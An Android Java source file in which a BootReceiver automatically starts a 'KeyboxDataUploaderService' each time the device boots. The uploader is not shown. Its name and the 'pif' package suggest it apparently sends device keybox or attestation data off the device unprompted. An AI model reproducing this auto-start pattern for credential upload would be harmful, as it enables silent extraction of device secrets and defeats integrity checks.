package com.goolag.pif;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Start the KeyboxDataUploaderService
        Intent serviceIntent = new Intent(context, KeyboxDataUploaderService.class);
        context.startService(serviceIntent);
    }
}
